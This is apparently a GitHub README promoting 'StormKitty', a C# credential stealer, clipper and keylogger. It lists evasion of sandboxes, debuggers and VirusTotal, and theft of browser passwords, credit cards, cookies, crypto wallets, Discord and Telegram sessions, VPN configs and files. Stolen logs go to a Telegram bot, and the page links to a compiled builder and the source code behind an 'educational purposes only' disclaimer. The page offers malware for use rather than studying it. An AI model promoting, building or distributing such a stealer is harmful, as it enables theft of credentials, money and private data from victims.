<p align="center">
  <img src="https://i.ibb.co/HhmVR2v/logo.png"> <br>
  <b>Stealer + Clipper + Keylogger</b> <br>
  <i>Stealer written on C#, logs will be sent to Telegram bot.</i>
</p>



***

# :construction: Disclaimer
I, the creator, am not responsible for any actions, and or damages, caused by this software.
You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.
This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
By using this software, you automatically agree to the above.

***

# 🔱 Functions
* AntiAnalysis (VirtualBox, SandBox, Emulator, Debugger, VirusTotal, Any.Run)
* Steal system info (Version, CPU, GPU, RAM, IPs, BSSID, Location, Screen metrics)
* Chromium based browsers (passwords, credit cards, cookies, history, autofill, bookmarks)
* Firefox based browsers (db files, cookies, history, bookmarks)
* Internet explorer/Edge (passwords)
* Saved wifi networks & scan networks around device (SSID, BSSID)
* File grabber (Documents, Images, Source codes, Databases, USB)
* Detect banking & cryptocurrency services in browsers
* Install keylogger & clipper
* Steam, Uplay, Minecraft session
* Desktop & Webcam screenshot
* ProtonVPN, OpenVPN, NordVPN
* Cryptocurrency Wallets
* Telegram sessions
* Pidgin accounts
* Discord tokens
* Filezilla hosts
* Process list
* Directories structure
* Product key
* Autorun module

***

## [📦 Download compiled builder and source code](https://github.com/LimerBoy/StormKitty/releases)

***

# :loudspeaker: Telegram notification:
<p align="center">
  <img src="https://i.ibb.co/n09cb1s/log.png">
</p>

***

# :eye: Detection:
<p align="center">
  <img src="https://antiscan.me/images/result/AkeZGzsBqkET.png">
</p>
